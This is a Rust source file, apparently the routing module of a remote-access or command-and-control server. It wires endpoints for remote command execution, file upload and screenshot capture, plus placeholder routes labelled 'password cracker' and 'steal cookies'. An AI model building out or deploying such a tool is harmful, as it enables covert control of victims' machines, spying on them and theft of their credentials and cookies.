mod exec;
mod file;
mod scrn;

use crate::ShellState;
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shellpath: Arc<Mutex<ShellState>>) -> Router {
    Router::new()
        .route("/", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("password cracker"))
        .route("/cookie", post("steal cookies"))
        .route("/exec", post(exec::exec_cmd))
        .route("/file", post(file::post_file))
        // routes for real time data
        .route("/scrn", post(scrn::screenshot))
        // extensions
        .layer(Extension(shellpath))
}
